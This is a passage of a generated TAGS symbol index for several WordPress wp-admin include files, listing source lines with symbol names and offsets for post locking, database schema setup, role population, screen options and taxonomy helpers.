	$user = isset( $lock[1] ) ? $lock[1] : get_post_meta( $post->ID, '_edit_last', true );user1187,36533
	$time_window = apply_filters( 'wp_check_post_lock_window', AUTOSAVE_INTERVAL * 2 );time_window1189,36622
function wp_set_post_lock( $post_id ) {wp_set_post_lock1205,37111
	$now = time();now1211,37270
	$lock = "$now:$user_id";lock1212,37286
function _admin_notice_post_locked() {_admin_notice_post_locked1224,37536
	$lock = explode( ':', get_post_meta( $post->ID, '_edit_lock', true ) );lock1227,37591
	$user = isset( $lock[1] ) ? $lock[1] : get_post_meta( $post->ID, '_edit_last', true );user1228,37664
	$last_user = get_userdata( $user );last_user1229,37752
	$last_user_name = $last_user ? $last_user->display_name : __('Somebody');last_user_name1230,37789
			$message = __( 'Warning: %s is currently editing this post' );message1234,37909
			$message = __( 'Warning: %s is currently editing this page' );message1237,38000
			$message = __( 'Warning: %s is currently editing this.' );message1240,38087
	$message = sprintf( $message, esc_html( $last_user_name ) );message1243,38153
function wp_create_post_autosave( $post_id ) {wp_create_post_autosave1259,38508
	$translated = _wp_translate_postdata( true );translated1260,38555
	if ( $old_autosave = wp_get_post_autosave( $post_id ) ) {old_autosave1265,38736
		$new_autosave = _wp_post_revision_fields( $_POST, true );new_autosave1266,38795
	$_POST = stripslashes_deep($_POST);_POST1273,39047
function post_preview() {post_preview1296,39563
	$post_ID = (int) $_POST['post_ID'];post_ID1298,39590
	$status = get_post_status( $post_ID );status1299,39627
	$post = get_post($post_ID);post1313,40100
		$id = edit_post();id1324,40435
		$id = wp_create_post_autosave( $post->ID );id1326,40552
			$id = $post->ID;id1328,40626
		$url = add_query_arg( 'preview', 'true', get_permalink($id) );url1335,40758
		$nonce = wp_create_nonce('post_preview_' . $id);nonce1337,40833
		$url = add_query_arg( array( 'preview' => 'true', 'preview_id' => $id, 'preview_nonce' => $nonce ), get_permalink($id) );url1338,40884

wordpress/wp-admin/includes/schema.php,7697
$charset_collate = '';charset_collate20,387
	$charset_collate = "DEFAULT CHARACTER SET $wpdb->charset";charset_collate23,444
function wp_get_db_schema( $scope = 'all', $blog_id = null ) {wp_get_db_schema36,971
function wp_get_db_schema( $scope = 'all', $blog_id = null ) {scope36,971
	$charset_collate = '';charset_collate39,1050
		$charset_collate = "DEFAULT CHARACTER SET $wpdb->charset";charset_collate42,1107
		$old_blog_id = $wpdb->set_blog_id( $blog_id );old_blog_id47,1296
	$is_multisite = is_multisite() || ( defined( 'WP_INSTALLING_NETWORK' ) && WP_INSTALLING_NETWORK );is_multisite50,1419
	$blog_tables = "CREATE TABLE $wpdb->terms (blog_tables53,1546
	$users_single_table = "CREATE TABLE $wpdb->users (users_single_table177,6703
	$users_multi_table = "CREATE TABLE $wpdb->users (users_multi_table194,7395
	$usermeta_table = "CREATE TABLE $wpdb->usermeta (usermeta_table213,8156
		$global_tables = $users_multi_table . $usermeta_table;global_tables225,8519
		$global_tables = $users_single_table . $usermeta_table;global_tables227,8582
	$ms_global_tables = "CREATE TABLE $wpdb->blogs (ms_global_tables230,8670
			$queries = $blog_tables;queries296,11053
			$queries = $global_tables;queries299,11109
			$queries = $ms_global_tables;queries304,11229
			$queries = $global_tables . $blog_tables;queries308,11298
$wp_queries = wp_get_db_schema( 'all' );wp_queries321,11535
function populate_options() {populate_options330,11699
	$guessurl = wp_guess_url();guessurl333,11800
		$uploads_use_yearmonth_folders = 0;uploads_use_yearmonth_folders339,11963
		$uploads_use_yearmonth_folders = 1;uploads_use_yearmonth_folders341,12011
	$template = WP_DEFAULT_THEME;template344,12053
	$theme = wp_get_theme( $template );theme346,12151
		$template = $theme->get_template();template348,12215
	$timezone_string = '';timezone_string350,12254
	$gmt_offset = 0;gmt_offset351,12278
	$offset_or_tz = _x( '0', 'default GMT offset or timezone string' );offset_or_tz356,12543
		$gmt_offset = $offset_or_tz;gmt_offset358,12648
			$timezone_string = $offset_or_tz;timezone_string360,12763
	$options = array(options362,12801
	$fat_options = array( 'moderation_keys', 'recently_edited', 'blacklist_keys', 'uninstall_plugins' );fat_options505,16601
	$existing_options = $wpdb->get_col("SELECT option_name FROM $wpdb->options");existing_options507,16704
	$insert = '';insert509,16784
	foreach ( $options as $option => $value ) {option510,16799
			$autoload = 'no';autoload514,16944
			$autoload = 'yes';autoload516,16972
		$option = $wpdb->escape($option);option518,16995
			$value = serialize($value);value520,17057
		$value = $wpdb->escape($value);value521,17088
	$unusedoptions = array ('blodotgsping_url', 'bodyterminator', 'emailtestonly', 'phoneemail_separator', 'smilies_directory', 'subjectprefix', 'use_bbcode', 'use_blodotgsping', 'use_phoneemail', 'use_quicktags', 'use_weblogsping', 'weblogs_cache_file', 'use_preview', 'use_htmltrans', 'smilies_directory', 'fileupload_allowedusers', 'use_phoneemail', 'default_post_status', 'default_post_category', 'archive_mode', 'time_difference', 'links_minadminlevel', 'links_use_adminlevels', 'links_rating_type', 'links_rating_char', 'links_rating_ignore_zero', 'links_rating_single_image', 'links_rating_image0', 'links_rating_image1', 'links_rating_image2', 'links_rating_image3', 'links_rating_image4', 'links_rating_image5', 'links_rating_image6', 'links_rating_image7', 'links_rating_image8', 'links_rating_image9', 'weblogs_cacheminutes', 'comment_allowed_tags', 'search_engine_friendly_urls', 'default_geourl_lat', 'default_geourl_lon', 'use_default_geourl', 'weblogs_xml_url', 'new_users_can_blog', '_wpnonce', '_wp_http_referer', 'Update', 'action', 'rich_editing', 'autosave_interval', 'deactivated_plugins', 'can_compress_scripts', 'page_uris', 'update_core', 'update_plugins', 'update_themes', 'doing_cron', 'random_seed', 'rss_excerpt_length', 'secret', 'use_linksupdate', 'default_comment_status_page', 'wporg_popular_tags', 'what_to_show', 'rss_language');unusedoptions534,17488
function populate_roles() {populate_roles547,19146
function populate_roles_160() {populate_roles_160563,19426
	$role =& get_role('administrator');role585,20059
	$role =& get_role('editor');role618,21073
	$role =& get_role('author');role640,21735
	$role =& get_role('contributor');role651,22048
	$role =& get_role('subscriber');role658,22229
function populate_roles_210() {populate_roles_210668,22402
	$roles = array('administrator', 'editor');roles669,22434
		$role =& get_role($role);role671,22507
	$role =& get_role('administrator');role692,23173
	$role =& get_role('author');role698,23307
	$role =& get_role('contributor');role704,23444
function populate_roles_230() {populate_roles_230715,23627
	$role =& get_role( 'administrator' );role716,23659
function populate_roles_250() {populate_roles_250728,23855
	$role =& get_role( 'administrator' );role729,23887
function populate_roles_260() {populate_roles_260741,24080
	$role =& get_role( 'administrator' );role742,24112
function populate_roles_270() {populate_roles_270755,24343
	$role =& get_role( 'administrator' );role756,24375
function populate_roles_280() {populate_roles_280769,24606
	$role =& get_role( 'administrator' );role770,24638
function populate_roles_300() {populate_roles_300782,24831
	$role =& get_role( 'administrator' );role783,24863
function install_network() {install_network804,25316
		define( 'WP_INSTALLING_NETWORK', true );WP_INSTALLING_NETWORK806,25390
function populate_network( $network_id = 1, $domain = '', $email = '', $site_name = '', $path = '/', $subdomain_install = false ) {populate_network821,25753
function populate_network( $network_id = 1, $domain = '', $email = '', $site_name = '', $path = '/', $subdomain_install = false ) {network_id821,25753
	$errors = new WP_Error();errors824,25945
	if ( $network_id == $wpdb->get_var( $wpdb->prepare( "SELECT id FROM $wpdb->site WHERE id = %d", $network_id ) ) )network_id831,26223
	$site_user = get_user_by( 'email', $email );site_user834,26411
	$template = get_option( 'template' );template842,26648
	$stylesheet = get_option( 'stylesheet' );stylesheet843,26687
	$allowed_themes = array( $stylesheet => true );allowed_themes844,26730
		$network_id = $wpdb->insert_id;network_id852,27077
		$site_admins = array( $site_user->user_login );site_admins858,27251
		$users = get_users( array( 'fields' => array( 'ID', 'user_login' ) ) );users859,27301
		$site_admins = get_site_option( 'site_admins' );site_admins867,27573
	$welcome_email = __( 'Dear User,welcome_email870,27628
	$sitemeta = array(sitemeta884,27949
	$insert = '';insert910,29140
	foreach ( $sitemeta as $meta_key => $meta_value ) {meta_key911,29155
		$meta_key = $wpdb->escape( $meta_key );meta_key912,29208
			$meta_value = serialize( $meta_value );meta_value914,29283
		$meta_value = $wpdb->escape( $meta_value );meta_value915,29326
		$blog_id = $wpdb->insert_id;blog_id928,29868
			$upload_path = substr( WP_CONTENT_DIR, strlen( ABSPATH ) ) . '/uploads';upload_path932,30082
		$vhost_ok = false;vhost_ok946,30555
		$errstr = '';errstr947,30576
		$hostname = substr( md5( time() ), 0, 6 ) . '.' . $domain; // Very random hostname!hostname948,30592
		$page = wp_remote_get( 'http://' . $hostname, array( 'timeout' => 5, 'httpversion' => '1.1' ) );page949,30678
			$errstr = $page->get_error_message();errstr951,30807
				$vhost_ok = true;vhost_ok953,30910
			$msg = '<p><strong>' . __( 'Warning! Wildcard DNS may not be configured correctly!' ) . '</strong></p>';msg956,30956

wordpress/wp-admin/includes/screen.php,10994
function get_column_headers( $screen ) {get_column_headers17,320
		$screen = convert_to_screen( $screen );screen19,390
	static $column_headers = array();column_headers21,433
	static $column_headers = array();column_headers21,433
function get_hidden_columns( $screen ) {get_hidden_columns37,820
		$screen = convert_to_screen( $screen );screen39,890
function meta_box_prefs( $screen ) {meta_box_prefs51,1130
		$screen = convert_to_screen( $screen );screen55,1221
	$hidden = get_hidden_meta_boxes($screen);hidden60,1318
				$box_id = $box['id'];box_id70,1761
function get_hidden_meta_boxes( $screen ) {get_hidden_meta_boxes87,2237
		$screen = convert_to_screen( $screen );screen89,2310
	$hidden = get_user_option( "metaboxhidden_{$screen->id}" );hidden91,2353
	$use_defaults = ! is_array( $hidden );use_defaults93,2415
		$hidden = array();hidden97,2511
				$hidden = array('slugdiv', 'trackbacksdiv', 'postcustom', 'postexcerpt', 'commentstatusdiv', 'commentsdiv', 'authordiv', 'revisionsdiv');hidden100,2638
				$hidden = array( 'slugdiv' );hidden102,2788
		$hidden = apply_filters( 'default_hidden_meta_boxes', $hidden, $screen );hidden104,2826
function add_screen_option( $option, $args = array() ) {add_screen_option118,3158
function add_screen_option( $option, $args = array() ) {args118,3158
	$current_screen = get_current_screen();current_screen119,3215
function screen_icon( $screen = '' ) {screen_icon136,3656
function screen_icon( $screen = '' ) {screen136,3656
function get_screen_icon( $screen = '' ) {get_screen_icon149,4056
function get_screen_icon( $screen = '' ) {screen149,4056
		$screen = get_current_screen();screen151,4124
		$icon_id = $screen;icon_id153,4191
	$class = 'icon32';class155,4214
			$icon_id = $screen->parent_base;icon_id159,4304
			$icon_id = $screen->base;icon_id161,4347
			$icon_id = 'edit-pages';icon_id164,4415
function get_current_screen() {get_current_screen180,4756
function set_current_screen( $hook_name = '' ) {set_current_screen198,5127
function set_current_screen( $hook_name = '' ) {hook_name198,5127
 * A class representing the admin screen.representing203,5236
final class WP_Screen {WP_Screen208,5319
	public $action;action216,5512
	public $base;base226,5775
	private $columns = 0;columns235,5920
	private $columns = 0;columns235,5920
	public $id;id244,6043
	public $is_network;is_network253,6169
	public $is_user;is_user262,6300
	public $parent_base;parent_base273,6616
	public $parent_file;parent_file283,6866
	public $post_type;post_type294,7169
	public $taxonomy;taxonomy303,7384
	private $_help_tabs = array();_help_tabs312,7533
	private $_help_tabs = array();_help_tabs312,7533
	private $_help_sidebar = '';_help_sidebar321,7693
	private $_help_sidebar = '';_help_sidebar321,7693
	private static $_old_compat_help = array();_old_compat_help326,7768
	private static $_old_compat_help = array();_old_compat_help326,7768
	private $_options = array();_options335,7935
	private $_options = array();_options335,7935
	private static $_registry = array();_registry344,8064
	private static $_registry = array();_registry344,8064
	private $_show_screen_options;_show_screen_options353,8234
	private $_screen_settings;_screen_settings362,8394
	public static function get( $hook_name = '' ) {get374,8713
	public static function get( $hook_name = '' ) {hook_name374,8713
		$post_type = $taxonomy = null;post_type379,8827
		$is_network = $is_user = false;is_network380,8860
		$action = '';action381,8894
			$id = $hook_name;id384,8931
			$id = $GLOBALS['hook_suffix'];id386,8959
			$post_type = $id;post_type390,9083
			$id = 'post'; // changes later. ends up being $base.id391,9104
				$id = substr( $id, 0, -4 );id394,9209
				$id = substr( $id, 0, -4 );id397,9336
				$action = 'add';action398,9368
				$id = substr( $id, 0, -8 );id404,9481
				$is_network = true;is_network405,9513
				$id = substr( $id, 0, -5 );id407,9584
				$is_user = true;is_user408,9616
			$id = sanitize_key( $id );id411,9643
				$maybe = substr( $id, 5 );maybe413,9764
 					$id = 'edit-tags';id415,9834
					$taxonomy = $maybe;taxonomy416,9859
					$id = 'edit';id418,9930
					$post_type = $maybe;post_type419,9949
			$is_network = is_network_admin();is_network423,9998
			$is_user = is_user_admin();is_user424,10035
			$id = 'dashboard';id428,10095
		$base = $id;base430,10118
				$post_type = post_type_exists( $_REQUEST['post_type'] ) ? $_REQUEST['post_type'] : false;post_type435,10298
				$taxonomy = taxonomy_exists( $_REQUEST['taxonomy'] ) ? $_REQUEST['taxonomy'] : false;taxonomy437,10433
						$post_id = (int) $_GET['post'];post_id442,10599
						$post_id = (int) $_POST['post_ID'];post_id444,10680
						$post_id = 0;post_id446,10732
						$post = get_post( $post_id );post449,10776
							$post_type = $post->post_type;post_type451,10831
						$post_type = 'post';post_type456,11014
					$post_type = 'post';post_type464,11133
				$id = $post_type;id465,11159
					$post_type = 'post';post_type469,11240
					$taxonomy = 'post_tag';taxonomy474,11358
				$id = 'edit-' . $taxonomy;id475,11387
			$screen = self::$_registry[ $id ];screen488,11623
			if ( $screen === get_current_screen() )screen489,11661
			$screen = new WP_Screen();screen492,11735
	function set_current_screen() {set_current_screen514,12191
		$current_screen = $this;current_screen516,12269
		$taxnow = $this->taxonomy;taxnow517,12296
		$typenow = $this->post_type;typenow518,12325
	private function __construct() {}__construct528,12477
	static function add_old_compat_help( $screen, $help ) {add_old_compat_help540,12728
	function set_parentage( $parent_file ) {set_parentage552,13115
		$this->parent_file = $parent_file;parent_file553,13157
		$this->parent_base = str_replace( '.php', '', $this->parent_base );parent_base555,13255
	public function add_option( $option, $args = array() ) {add_option567,13605
	public function add_option( $option, $args = array() ) {args567,13605
	public function get_option( $option, $key = false ) {get_option579,13914
	public function get_option( $option, $key = false ) {key579,13914
	public function get_help_tabs() {get_help_tabs597,14339
	public function get_help_tab( $id ) {get_help_tab609,14553
	public function add_help_tab( $args ) {add_help_tab628,15135
		$defaults = array(defaults629,15176
		$args = wp_parse_args( $args, $defaults );args635,15295
	public function remove_help_tab( $id ) {remove_help_tab654,15729
	public function remove_help_tabs() {remove_help_tabs663,15910
		$this->_help_tabs = array();_help_tabs664,15948
	public function get_help_sidebar() {get_help_sidebar674,16120
	public function set_help_sidebar( $content ) {set_help_sidebar686,16488
		$this->_help_sidebar = $content;_help_sidebar687,16536
	public function get_columns() {get_columns703,17095
	public function render_screen_meta() {render_screen_meta714,17304
		$old_help = isset( self::$_old_compat_help[ $this->id ] ) ? self::$_old_compat_help[ $this->id ] : '';old_help719,17490
		$old_help = apply_filters( 'contextual_help', $old_help, $this->id, $this );old_help720,17595
			$default_help = apply_filters( 'default_contextual_help', '' );default_help724,17823
				$old_help = '<p>' . $default_help . '</p>';old_help726,17914
		$help_sidebar = $this->get_help_sidebar();help_sidebar737,18133
		$help_class = 'hidden';help_class739,18179
						$class = ' class="active"';class753,18564
							$link_id  = "tab-link-{$tab['id']}";link_id755,18649
							$panel_id = "tab-panel-{$tab['id']}";panel_id756,18693
							$class = '';class765,18969
						$classes = 'help-tab-content active';classes779,19247
							$panel_id = "tab-panel-{$tab['id']}";panel_id781,19341
							$classes = 'help-tab-content';classes795,19756
		$columns = apply_filters( 'screen_layout_columns', array(), $this->id, $this );columns805,19966
			$this->columns = (int) get_user_option("screen_layout_$this->id");columns811,20244
				$this->columns = $this->get_option( 'layout_columns', 'default' );columns814,20394
	public function show_screen_options() {show_screen_options842,21343
		$columns = get_column_headers( $this );columns848,21498
		$show_screen = ! empty( $wp_meta_boxes[ $this->id ] ) || $columns || $this->get_option( 'per_page' );show_screen850,21541
		$this->_screen_settings = apply_filters( 'screen_settings', '', $this );_screen_settings852,21646
				$this->_screen_settings = '<p><a id="access-on" href="widgets.php?widgets-access=on">' . __('Enable accessibility mode') . '</a><a id="access-off" href="widgets.php?widgets-access=off">' . __('Disable accessibility mode') . "</a></p>\n";_screen_settings856,21766
			$show_screen = true;show_screen861,22076
		$this->_show_screen_options = apply_filters( 'screen_options_show_screen', $show_screen, $this );_show_screen_options863,22101
	public function render_screen_options() {render_screen_options872,22309
		$columns = get_column_headers( $this );columns875,22394
		$hidden  = get_hidden_columns( $this );hidden876,22436
							$welcome_checked = empty( $_GET['welcome'] ) ? 0 : 1;welcome_checked893,23033
							$welcome_checked = get_user_meta( get_current_user_id(), 'show_welcome_panel', true );welcome_checked896,23199
								$welcome_checked = false;welcome_checked898,23397
				$special = array('_title', 'cb', 'comment', 'media', 'name', 'title', 'username', 'blogname');special914,23909
				foreach ( $columns as $column => $title ) {column916,24009
						$title = __( 'Comments' );title924,24240
					$id = "$column-hide";id925,24273
	function render_screen_layout() {render_screen_layout951,24932
		$screen_layout_columns = $this->get_columns();screen_layout_columns955,25026
		$num = $this->get_option( 'layout_columns', 'max' );num956,25075
			for ( $i = 1; $i <= $num; ++$i ):i962,25263
	function render_per_page_options() {render_per_page_options980,25662
		$per_page_label = $this->get_option( 'per_page', 'label' );per_page_label984,25755
		$option = $this->get_option( 'per_page', 'option' );option986,25818
			$option = str_replace( '-', '_', "{$this->id}_per_page" );option988,25892
		$per_page = (int) get_user_option( $option );per_page990,25955
			$per_page = $this->get_option( 'per_page', 'default' );per_page992,26050
				$per_page = 20;per_page994,26131
			$comment_status = isset( $_REQUEST['comment_status'] ) ? $_REQUEST['comment_status'] : 'all';comment_status998,26203
			$per_page = apply_filters( 'comments_per_page', $per_page, $comment_status );per_page999,26300
			$per_page = apply_filters( 'edit_categories_per_page', $per_page );per_page1001,26431
			$per_page = apply_filters( $option, $per_page );per_page1003,26513
			$per_page = apply_filters( 'edit_posts_per_page', $per_page, $this->post_type );per_page1008,26622

wordpress/wp-admin/includes/taxonomy.php,3210
function category_exists($cat_name, $parent = 0) {category_exists21,255
function category_exists($cat_name, $parent = 0) {parent21,255
	$id = term_exists($cat_name, 'category', $parent);id22,306
		$id = $id['term_id'];id24,380
function get_category_to_edit( $id ) {get_category_to_edit36,538
	$category = get_category( $id, OBJECT, 'edit' );category37,577
function wp_create_category( $cat_name, $parent = 0 ) {wp_create_category50,804
function wp_create_category( $cat_name, $parent = 0 ) {parent50,804
	if ( $id = category_exists($cat_name, $parent) )id51,860
function wp_create_categories($categories, $post_id = '') {wp_create_categories66,1178
function wp_create_categories($categories, $post_id = '') {post_id66,1178
	$cat_ids = array ();cat_ids67,1238
function wp_insert_category($catarr, $wp_error = false) {wp_insert_category91,2009
function wp_insert_category($catarr, $wp_error = false) {wp_error91,2009
	$cat_defaults = array('cat_ID' => 0, 'taxonomy' => 'category', 'cat_name' => '', 'category_description' => '', 'category_nicename' => '', 'category_parent' => '');cat_defaults92,2067
	$catarr = wp_parse_args($catarr, $cat_defaults);catarr93,2232
	$cat_ID = (int) $cat_ID;cat_ID103,2472
		$update = true;update107,2557
		$update = false;update109,2581
	$name = $cat_name;name111,2601
	$description = $category_description;description112,2621
	$slug = $category_nicename;slug113,2660
	$parent = $category_parent;parent114,2689
	$parent = (int) $parent;parent116,2719
		$parent = 0;parent118,2765
		$parent = 0;parent121,2914
	$args = compact('name', 'slug', 'parent', 'description');args123,2930
		$cat_ID = wp_update_term($cat_ID, $taxonomy, $args);cat_ID126,3006
		$cat_ID = wp_insert_term($cat_name, $taxonomy, $args);cat_ID128,3067
 * function with only the new values set inside $catarr.with144,3384
function wp_update_category($catarr) {wp_update_category151,3655
	$cat_ID = (int) $catarr['cat_ID'];cat_ID152,3694
	$category = get_category($cat_ID, ARRAY_A);category158,3875
	$category = add_magic_quotes($category);category161,3953
	$catarr = array_merge($category, $catarr);catarr164,4063
function tag_exists($tag_name) {tag_exists181,4287
function wp_create_tag($tag_name) {wp_create_tag193,4491
function get_tags_to_edit( $post_id, $taxonomy = 'post_tag' ) {get_tags_to_edit205,4701
function get_tags_to_edit( $post_id, $taxonomy = 'post_tag' ) {taxonomy205,4701
function get_terms_to_edit( $post_id, $taxonomy = 'post_tag' ) {get_terms_to_edit217,4940
function get_terms_to_edit( $post_id, $taxonomy = 'post_tag' ) {taxonomy217,4940
	$post_id = (int) $post_id;post_id218,5005
	$tags = wp_get_post_terms($post_id, $taxonomy, array());tags222,5068
	$tags_to_edit = join( ',', $tag_names );tags_to_edit232,5259
	$tags_to_edit = esc_attr( $tags_to_edit );tags_to_edit233,5301
	$tags_to_edit = apply_filters( 'terms_to_edit', $tags_to_edit, $taxonomy );tags_to_edit234,5345
function wp_create_term($tag_name, $taxonomy = 'post_tag') {wp_create_term247,5573
function wp_create_term($tag_name, $taxonomy = 'post_tag') {taxonomy247,5573
	if ( $id = term_exists($tag_name, $taxonomy) )id248,5634

wordpress/wp-admin/includes/template.php,23136
class Walker_Category_Checklist extends Walker {Walker_Category_Checklist23,390
	var $tree_type = 'category';tree_type24,439
	var $tree_type = 'category';tree_type24,439
	var $db_fields = array ('parent' => 'parent', 'id' => 'term_id'); //TODO: decouple thisdb_fields25,469
	var $db_fields = array ('parent' => 'parent', 'id' => 'term_id'); //TODO: decouple thisdb_fields25,469
	function start_lvl( &$output, $depth = 0, $args = array() ) {start_lvl27,559
	function start_lvl( &$output, $depth = 0, $args = array() ) {depth27,559
		$indent = str_repeat("\t", $depth);indent28,622
	function end_lvl( &$output, $depth = 0, $args = array() ) {end_lvl32,711
	function end_lvl( &$output, $depth = 0, $args = array() ) {depth32,711
		$indent = str_repeat("\t", $depth);indent33,772
	function start_el( &$output, $category, $depth, $args, $id = 0 ) {start_el37,845
	function start_el( &$output, $category, $depth, $args, $id = 0 ) {id37,845
			$taxonomy = 'category';taxonomy40,957
		if ( $taxonomy == 'category' )taxonomy42,985
			$name = 'post_category';name43,1018
			$name = 'tax_input['.$taxonomy.']';name45,1053
		$class = in_array( $category->term_id, $popular_cats ) ? ' class="popular-category"' : '';class47,1093
	function end_el( &$output, $category, $depth = 0, $args = array() ) {end_el51,1622
	function end_el( &$output, $category, $depth = 0, $args = array() ) {depth51,1622
function wp_category_checklist( $post_id = 0, $descendants_and_self = 0, $selected_cats = false, $popular_cats = false, $walker = null, $checked_ontop = true ) {wp_category_checklist70,2429
function wp_category_checklist( $post_id = 0, $descendants_and_self = 0, $selected_cats = false, $popular_cats = false, $walker = null, $checked_ontop = true ) {post_id70,2429
function wp_terms_checklist($post_id = 0, $args = array()) {wp_terms_checklist90,3066
function wp_terms_checklist($post_id = 0, $args = array()) {args90,3066
 	$defaults = array(defaults91,3127
	$args = apply_filters( 'wp_terms_checklist_args', $args, $post_id );args99,3312
		$walker = new Walker_Category_Checklist;walker104,3491
	$descendants_and_self = (int) $descendants_and_self;descendants_and_self106,3535
	$args = array('taxonomy' => $taxonomy);args108,3590
	$tax = get_taxonomy($taxonomy);tax110,3632
		$categories = (array) get_terms($taxonomy, array( 'child_of' => $descendants_and_self, 'hierarchical' => 0, 'hide_empty' => 0 ) );categories126,4262
		$self = get_term( $descendants_and_self, $taxonomy );self127,4395
		$categories = (array) get_terms($taxonomy, array('get' => 'all'));categories130,4500
		$checked_categories = array();checked_categories135,4749
		$keys = array_keys( $categories );keys136,4782
function wp_popular_terms_checklist( $taxonomy, $default = 0, $number = 10, $echo = true ) {wp_popular_terms_checklist168,5884
function wp_popular_terms_checklist( $taxonomy, $default = 0, $number = 10, $echo = true ) {default168,5884
		$checked_terms = wp_get_object_terms($post_ID, $taxonomy, array('fields'=>'ids'));checked_terms172,6013
		$checked_terms = array();checked_terms174,6104
	$terms = get_terms( $taxonomy, array( 'orderby' => 'count', 'order' => 'DESC', 'number' => $number, 'hierarchical' => false ) );terms176,6133
	$tax = get_taxonomy($taxonomy);tax178,6264
		$disabled = 'disabled="disabled"';disabled180,6349
		$disabled = '';disabled182,6392
	$popular_ids = array();popular_ids184,6411
		$id = "popular-$taxonomy-$term->term_id";id189,6560
		$checked = in_array( $term->term_id, $checked_terms ) ? 'checked="checked"' : '';checked190,6604
function wp_link_category_checklist( $link_id = 0 ) {wp_link_category_checklist212,7162
function wp_link_category_checklist( $link_id = 0 ) {link_id212,7162
	$default = 1;default213,7216
		$checked_categories = wp_get_link_cats( $link_id );checked_categories216,7251
	$categories = get_terms( 'link_category', array( 'orderby' => 'name', 'hide_empty' => 0 ) );categories224,7469
		$cat_id = $category->term_id;cat_id230,7644
		$name = esc_html( apply_filters( 'the_category', $category->name ) );name231,7676
		$checked = in_array( $cat_id, $checked_categories ) ? ' checked="checked"' : '';checked232,7748
function get_inline_data($post) {get_inline_data245,8276
	$post_type_object = get_post_type_object($post->post_type);post_type_object246,8310
	$title = esc_textarea( trim( $post->post_title ) );title250,8455
	$taxonomy_names = get_object_taxonomies( $post->post_type );taxonomy_names277,9892
		$taxonomy = get_taxonomy( $taxonomy_name );taxonomy279,10002
function wp_comment_reply($position = '1', $checkbox = false, $mode = 'single', $table_row = true) {wp_comment_reply308,10988
function wp_comment_reply($position = '1', $checkbox = false, $mode = 'single', $table_row = true) {checkbox308,10988
	$content = apply_filters( 'wp_comment_reply', '', array('position' => $position, 'checkbox' => $checkbox, 'mode' => $mode) );content310,11135
	if ( $mode == 'single' ) {mode317,11322
		$wp_list_table = _get_list_table('WP_Post_Comments_List_Table');wp_list_table318,11350
		$wp_list_table = _get_list_table('WP_Comments_List_Table');wp_list_table320,11427
	$quicktags_settings = array( 'buttons' => 'strong,em,link,block,del,ins,img,ul,ol,li,code,spell,close' );quicktags_settings352,12715
function wp_comment_trashnotice() {wp_comment_trashnotice395,14700
function list_meta( $meta ) {list_meta413,15320
	$count = 0;count430,15702
function _list_meta_row( $entry, &$count ) {_list_meta_row458,16167
	static $update_nonce = false;update_nonce459,16212
	static $update_nonce = false;update_nonce459,16212
		$update_nonce = wp_create_nonce( 'add-meta' );update_nonce465,16334
	$r = '';r467,16384
		$style = 'alternate';style470,16425
		$style = '';style472,16455
	$delete_nonce = wp_create_nonce( 'delete-meta_' . $entry['meta_id'] );delete_nonce489,16999
function meta_form() {meta_form511,18325
	$limit = (int) apply_filters( 'postmeta_form_limit', 30 );limit513,18363
	$keys = $wpdb->get_col( "keys514,18423
function touch_time( $edit = 1, $for_post = 1, $tab_index = 0, $multi = 0 ) {touch_time577,20308
function touch_time( $edit = 1, $for_post = 1, $tab_index = 0, $multi = 0 ) {edit577,20308
		$edit = ! ( in_array($post->post_status, array('draft', 'pending') ) && (!$post->post_date_gmt || '0000-00-00 00:00:00' == $post->post_date_gmt ) );edit581,20442
	$tab_index_attribute = '';tab_index_attribute583,20594
		$tab_index_attribute = " tabindex=\"$tab_index\"";tab_index_attribute585,20651
	$time_adj = current_time('timestamp');time_adj589,20915
	$post_date = ($for_post) ? $post->post_date : $comment->comment_date;post_date590,20955
	$jj = ($edit) ? mysql2date( 'd', $post_date, false ) : gmdate( 'd', $time_adj );jj591,21026
	$mm = ($edit) ? mysql2date( 'm', $post_date, false ) : gmdate( 'm', $time_adj );mm592,21108
	$aa = ($edit) ? mysql2date( 'Y', $post_date, false ) : gmdate( 'Y', $time_adj );aa593,21190
	$hh = ($edit) ? mysql2date( 'H', $post_date, false ) : gmdate( 'H', $time_adj );hh594,21272
	$mn = ($edit) ? mysql2date( 'i', $post_date, false ) : gmdate( 'i', $time_adj );mn595,21354
	$ss = ($edit) ? mysql2date( 's', $post_date, false ) : gmdate( 's', $time_adj );ss596,21436
	$cur_jj = gmdate( 'd', $time_adj );cur_jj598,21519
	$cur_mm = gmdate( 'm', $time_adj );cur_mm599,21556
	$cur_aa = gmdate( 'Y', $time_adj );cur_aa600,21593
	$cur_hh = gmdate( 'H', $time_adj );cur_hh601,21630
	$cur_mn = gmdate( 'i', $time_adj );cur_mn602,21667
	$month = "<select " . ( $multi ? '' : 'id="mm" ' ) . "name=\"mm\"$tab_index_attribute>\n";month604,21705
	for ( $i = 1; $i < 13; $i = $i +1 ) {i605,21797
		$monthnum = zeroise($i, 2);monthnum606,21836
		if ( $i == $mm )i608,21926
	$day = '<input type="text" ' . ( $multi ? '' : 'id="jj" ' ) . 'name="jj" value="' . $jj . '" size="2" maxlength="2"' . $tab_index_attribute . ' autocomplete="off" />';day615,22221
	$year = '<input type="text" ' . ( $multi ? '' : 'id="aa" ' ) . 'name="aa" value="' . $aa . '" size="4" maxlength="4"' . $tab_index_attribute . ' autocomplete="off" />';year616,22390
	$hour = '<input type="text" ' . ( $multi ? '' : 'id="hh" ' ) . 'name="hh" value="' . $hh . '" size="2" maxlength="2"' . $tab_index_attribute . ' autocomplete="off" />';hour617,22560
	$minute = '<input type="text" ' . ( $multi ? '' : 'id="mn" ' ) . 'name="mn" value="' . $mn . '" size="2" maxlength="2"' . $tab_index_attribute . ' autocomplete="off" />';minute618,22730
		$cur_timeunit = 'cur_' . $timeunit;cur_timeunit631,23430
function page_template_dropdown( $default = '' ) {page_template_dropdown650,23908
function page_template_dropdown( $default = '' ) {default650,23908
	$templates = get_page_templates();templates651,23959
		: if ( $default == $templates[$template] )default654,24067
			$selected = " selected='selected'";selected655,24112
			$selected = '';selected657,24158
function parent_dropdown( $default = 0, $parent = 0, $level = 0 ) {parent_dropdown672,24461
function parent_dropdown( $default = 0, $parent = 0, $level = 0 ) {default672,24461
	$items = $wpdb->get_results( $wpdb->prepare("SELECT ID, post_parent, post_title FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'page' ORDER BY menu_order", $parent) );items674,24554
			$pad = str_repeat( '&nbsp;', $level * 3 );pad684,24914
				$current = ' selected="selected"';current686,24991
				$current = '';current688,25038
function the_attachment_links( $id = false ) {the_attachment_links706,25386
function the_attachment_links( $id = false ) {id706,25386
	$id = (int) $id;id707,25433
	$post = & get_post( $id );post708,25451
